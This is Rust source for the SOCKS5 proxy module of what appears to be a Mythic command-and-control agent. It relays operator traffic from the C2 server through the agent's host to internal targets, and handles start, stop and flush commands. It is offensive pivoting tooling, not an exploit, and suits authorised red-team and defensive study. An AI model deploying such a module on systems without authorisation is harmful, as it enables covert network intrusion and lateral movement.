use crate::structs::{SocksMsg, Task};
use crate::utils;
use base64::{engine::general_purpose::STANDARD as BASE64, Engine};
use serde::Deserialize;
use std::collections::HashMap;
use std::sync::Arc;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::sync::{mpsc, Mutex, Notify};
use tokio::time::Duration;

// SOCKS5 protocol constants
const SOCKS5_VERSION: u8 = 0x05;
const CMD_CONNECT: u8 = 0x01;
const ATYP_IPV4: u8 = 0x01;
const ATYP_FQDN: u8 = 0x03;
const ATYP_IPV6: u8 = 0x04;

const REPLY_SUCCESS: u8 = 0x00;
const REPLY_SERVER_FAILURE: u8 = 0x01;
const REPLY_NETWORK_UNREACHABLE: u8 = 0x03;
const REPLY_HOST_UNREACHABLE: u8 = 0x04;
const REPLY_CONNECTION_REFUSED: u8 = 0x05;
const REPLY_CMD_NOT_SUPPORTED: u8 = 0x07;
const REPLY_ADDR_NOT_SUPPORTED: u8 = 0x08;

const TCP_CONNECT_TIMEOUT: Duration = Duration::from_secs(10);
const READ_BUF_SIZE: usize = 4096;

/// Per-connection channel capacity. Large enough to absorb bursts
/// without blocking the main dispatch loop.
const CONN_CHANNEL_SIZE: usize = 512;

#[derive(Deserialize)]
struct SocksArgs {
    action: String,
    #[serde(default)]
    port: u16,
}

/// Shared state for all active SOCKS connections.
struct ConnectionManager {
    /// server_id -> sender that feeds the write-to-target task
    connections: Mutex<HashMap<u32, mpsc::Sender<SocksMsg>>>,
    /// Channel to send outbound messages back to Mythic
    to_mythic_tx: mpsc::Sender<SocksMsg>,
    /// Signaled by "stop" / "flush" commands to close all connections
    flush_notify: Arc<Notify>,
}

impl ConnectionManager {
    fn new(to_mythic_tx: mpsc::Sender<SocksMsg>) -> Self {
        Self {
            connections: Mutex::new(HashMap::new()),
            to_mythic_tx,
            flush_notify: Arc::new(Notify::new()),
        }
    }

    /// Close every tracked connection and clear the map.
    async fn close_all(&self) {
        let mut conns = self.connections.lock().await;
        let count = conns.len();
        // Dropping all senders causes the write tasks to exit,
        // which in turn closes the TCP streams.
        conns.clear();
        utils::print_debug(&format!("SOCKS: closed all {} connections", count));
    }

    /// Remove a single connection by server_id.
    async fn remove(&self, server_id: u32) {
        self.connections.lock().await.remove(&server_id);
    }

    /// Send a SOCKS5 error reply + exit back to Mythic.
    async fn send_exit(&self, server_id: u32, reply_code: u8) {
        let reply = build_socks_reply(reply_code, None);
        let _ = self
            .to_mythic_tx
            .send(SocksMsg {
                server_id,
                data: BASE64.encode(&reply),
                exit: true,
                port: 0,
            })
            .await;
    }

    /// Send data back to Mythic for a given server_id.
    async fn send_data(&self, server_id: u32, data: &[u8]) {
        let _ = self
            .to_mythic_tx
            .send(SocksMsg {
                server_id,
                data: BASE64.encode(data),
                exit: false,
                port: 0,
            })
            .await;
    }

    /// Send a bare exit (no SOCKS reply payload).
    async fn send_bare_exit(&self, server_id: u32) {
        let _ = self
            .to_mythic_tx
            .send(SocksMsg {
                server_id,
                data: String::new(),
                exit: true,
                port: 0,
            })
            .await;
    }
}

// ============================================================================
// Initialization — called once at agent startup
// ============================================================================

/// Lazily stored flush notifier so the command handler can trigger flushes.
static FLUSH_NOTIFY: std::sync::OnceLock<Arc<Notify>> = std::sync::OnceLock::new();

/// Start the background SOCKS message handler.
/// `from_mythic_rx` receives SOCKS messages routed from Mythic.
/// `to_mythic_tx` sends SOCKS messages back towards Mythic.
pub fn initialize(
    from_mythic_rx: mpsc::Receiver<SocksMsg>,
    to_mythic_tx: mpsc::Sender<SocksMsg>,
) {
    let manager = Arc::new(ConnectionManager::new(to_mythic_tx));

    // Store flush notifier so the command handler can access it
    let _ = FLUSH_NOTIFY.set(manager.flush_notify.clone());

    // Spawn flush listener
    let mgr = manager.clone();
    tokio::spawn(async move {
        loop {
            mgr.flush_notify.notified().await;
            mgr.close_all().await;
        }
    });

    // Spawn main dispatch loop
    tokio::spawn(dispatch_loop(from_mythic_rx, manager));
}

/// Main loop: reads SOCKS messages from Mythic and routes them.
async fn dispatch_loop(
    mut from_mythic_rx: mpsc::Receiver<SocksMsg>,
    manager: Arc<ConnectionManager>,
) {
    while let Some(msg) = from_mythic_rx.recv().await {
        let server_id = msg.server_id;

        // Clone sender under the lock, then release before sending.
        let tx = {
            let conns = manager.connections.lock().await;
            conns.get(&server_id).map(|tx| tx.clone())
        };

        if let Some(tx) = tx {
            if tx.try_send(msg).is_err() {
                utils::print_debug(&format!(
                    "SOCKS: dropping msg for server_id={}, channel full/closed",
                    server_id
                ));
            }
            continue;
        }

        // Unknown server_id with exit flag — nothing to do
        if msg.exit {
            continue;
        }

        // Decode the first message to check for SOCKS5 header
        let data = match BASE64.decode(&msg.data) {
            Ok(d) => d,
            Err(_) => continue,
        };

        if data.len() < 4 {
            continue;
        }

        if data[0] == SOCKS5_VERSION {
            let mgr = manager.clone();
            tokio::spawn(async move {
                handle_connect(server_id, data, mgr).await;
            });
        }
    }
}

// ============================================================================
// SOCKS5 CONNECT handling
// ============================================================================

/// Parse a SOCKS5 CONNECT request, connect to the target, and set up
/// bidirectional relay.
async fn handle_connect(server_id: u32, data: Vec<u8>, manager: Arc<ConnectionManager>) {
    let ver = data[0];
    let cmd = data[1];
    // data[2] is reserved

    if ver != SOCKS5_VERSION {
        manager.send_exit(server_id, REPLY_SERVER_FAILURE).await;
        return;
    }

    if cmd != CMD_CONNECT {
        manager.send_exit(server_id, REPLY_CMD_NOT_SUPPORTED).await;
        return;
    }

    // Parse address (ATYP + ADDR + PORT) starting at byte 3
    let target_addr = match parse_address(&data[3..]) {
        Some(addr) => addr,
        None => {
            manager
                .send_exit(server_id, REPLY_ADDR_NOT_SUPPORTED)
                .await;
            return;
        }
    };

    utils::print_debug(&format!(
        "SOCKS: CONNECT server_id={} -> {}",
        server_id, target_addr
    ));

    // Connect to target with timeout
    let stream =
        match tokio::time::timeout(TCP_CONNECT_TIMEOUT, TcpStream::connect(&target_addr)).await {
            Ok(Ok(s)) => s,
            Ok(Err(e)) => {
                let reply = if e.to_string().contains("refused") {
                    REPLY_CONNECTION_REFUSED
                } else if e.to_string().contains("unreachable") {
                    REPLY_NETWORK_UNREACHABLE
                } else {
                    REPLY_HOST_UNREACHABLE
                };
                utils::print_debug(&format!(
                    "SOCKS: CONNECT failed server_id={}: {}",
                    server_id, e
                ));
                manager.send_exit(server_id, reply).await;
                return;
            }
            Err(_) => {
                utils::print_debug(&format!("SOCKS: CONNECT timeout server_id={}", server_id));
                manager
                    .send_exit(server_id, REPLY_HOST_UNREACHABLE)
                    .await;
                return;
            }
        };

    // Disable Nagle for lower latency
    let _ = stream.set_nodelay(true);

    // Send success reply with bound address
    let local_addr = stream.local_addr().ok();
    let reply = build_socks_reply(REPLY_SUCCESS, local_addr);
    manager.send_data(server_id, &reply).await;

    // Split the TCP stream for bidirectional relay
    let (read_half, write_half) = stream.into_split();

    // Create channel for Mythic → target direction
    let (conn_tx, conn_rx) = mpsc::channel::<SocksMsg>(CONN_CHANNEL_SIZE);

    // Register this connection
    manager.connections.lock().await.insert(server_id, conn_tx);

    // Spawn reader: target → Mythic
    let mgr_r = manager.clone();
    tokio::spawn(async move {
        read_from_target(read_half, server_id, mgr_r).await;
    });

    // Spawn writer: Mythic → target
    let mgr_w = manager.clone();
    tokio::spawn(async move {
        write_to_target(conn_rx, write_half, server_id, mgr_w).await;
    });
}

// ============================================================================
// Bidirectional relay tasks
// ============================================================================

/// Read data from the proxied target and send it to Mythic.
async fn read_from_target(
    mut read_half: tokio::net::tcp::OwnedReadHalf,
    server_id: u32,
    manager: Arc<ConnectionManager>,
) {
    let mut buf = vec![0u8; READ_BUF_SIZE];
    loop {
        match read_half.read(&mut buf).await {
            Ok(0) => {
                // Connection closed normally
                manager.send_bare_exit(server_id).await;
                manager.remove(server_id).await;
                return;
            }
            Ok(n) => {
                manager.send_data(server_id, &buf[..n]).await;
            }
            Err(_) => {
                manager.send_bare_exit(server_id).await;
                manager.remove(server_id).await;
                return;
            }
        }
    }
}

/// Read data from Mythic (via channel) and write it to the proxied target.
async fn write_to_target(
    mut from_mythic: mpsc::Receiver<SocksMsg>,
    mut write_half: tokio::net::tcp::OwnedWriteHalf,
    server_id: u32,
    manager: Arc<ConnectionManager>,
) {
    while let Some(msg) = from_mythic.recv().await {
        if msg.exit {
            manager.remove(server_id).await;
            return;
        }

        if msg.data.is_empty() {
            continue;
        }

        let data = match BASE64.decode(&msg.data) {
            Ok(d) => d,
            Err(_) => {
                manager.send_bare_exit(server_id).await;
                manager.remove(server_id).await;
                return;
            }
        };

        if write_half.write_all(&data).await.is_err() {
            manager.send_bare_exit(server_id).await;
            manager.remove(server_id).await;
            return;
        }
    }
    // Channel closed (flush or connection removed) — TCP stream drops automatically.
}

// ============================================================================
// SOCKS5 protocol helpers
// ============================================================================

/// Parse ATYP + address + port from the buffer.
fn parse_address(data: &[u8]) -> Option<String> {
    if data.is_empty() {
        return None;
    }
    match data[0] {
        ATYP_IPV4 => {
            if data.len() < 7 {
                return None;
            }
            let ip = format!("{}.{}.{}.{}", data[1], data[2], data[3], data[4]);
            let port = ((data[5] as u16) << 8) | (data[6] as u16);
            Some(format!("{}:{}", ip, port))
        }
        ATYP_FQDN => {
            if data.len() < 2 {
                return None;
            }
            let len = data[1] as usize;
            if data.len() < 2 + len + 2 {
                return None;
            }
            let fqdn = String::from_utf8_lossy(&data[2..2 + len]).to_string();
            let port_off = 2 + len;
            let port = ((data[port_off] as u16) << 8) | (data[port_off + 1] as u16);
            Some(format!("{}:{}", fqdn, port))
        }
        ATYP_IPV6 => {
            if data.len() < 19 {
                return None;
            }
            let ip = std::net::Ipv6Addr::new(
                ((data[1] as u16) << 8) | (data[2] as u16),
                ((data[3] as u16) << 8) | (data[4] as u16),
                ((data[5] as u16) << 8) | (data[6] as u16),
                ((data[7] as u16) << 8) | (data[8] as u16),
                ((data[9] as u16) << 8) | (data[10] as u16),
                ((data[11] as u16) << 8) | (data[12] as u16),
                ((data[13] as u16) << 8) | (data[14] as u16),
                ((data[15] as u16) << 8) | (data[16] as u16),
            );
            let port = ((data[17] as u16) << 8) | (data[18] as u16);
            Some(format!("[{}]:{}", ip, port))
        }
        _ => None,
    }
}

/// Build a SOCKS5 reply message.
fn build_socks_reply(reply_code: u8, local_addr: Option<std::net::SocketAddr>) -> Vec<u8> {
    match local_addr {
        Some(std::net::SocketAddr::V4(addr)) => {
            let mut msg = vec![SOCKS5_VERSION, reply_code, 0x00, ATYP_IPV4];
            msg.extend_from_slice(&addr.ip().octets());
            let port = addr.port();
            msg.push((port >> 8) as u8);
            msg.push((port & 0xff) as u8);
            msg
        }
        Some(std::net::SocketAddr::V6(addr)) => {
            let mut msg = vec![SOCKS5_VERSION, reply_code, 0x00, ATYP_IPV6];
            msg.extend_from_slice(&addr.ip().octets());
            let port = addr.port();
            msg.push((port >> 8) as u8);
            msg.push((port & 0xff) as u8);
            msg
        }
        None => vec![SOCKS5_VERSION, reply_code, 0x00, ATYP_IPV4, 0, 0, 0, 0, 0, 0],
    }
}

// ============================================================================
// Command handler (called by task dispatcher)
// ============================================================================

pub async fn execute(task: Task) {
    let mut response = task.new_response();
    let args: SocksArgs = match serde_json::from_str(&task.data.params) {
        Ok(a) => a,
        Err(e) => {
            response.set_error(&format!("Failed to parse: {}", e));
            let _ = task.job.send_responses.send(response).await;
            let _ = task
                .remove_running_task
                .send(task.data.task_id.clone())
                .await;
            return;
        }
    };

    match args.action.as_str() {
        "start" => {
            response.user_output = format!("SOCKS5 proxy started on port {}", args.port);
            response.completed = true;
        }
        "stop" => {
            if let Some(notify) = FLUSH_NOTIFY.get() {
                notify.notify_one();
            }
            response.user_output = "SOCKS5 proxy stopped".to_string();
            response.completed = true;
        }
        "flush" => {
            if let Some(notify) = FLUSH_NOTIFY.get() {
                notify.notify_one();
            }
            response.user_output = "SOCKS5 connections flushed".to_string();
            response.completed = true;
        }
        _ => response.set_error(&format!("Unknown action: {}", args.action)),
    }

    let _ = task.job.send_responses.send(response).await;
    let _ = task
        .remove_running_task
        .send(task.data.task_id.clone())
        .await;
}
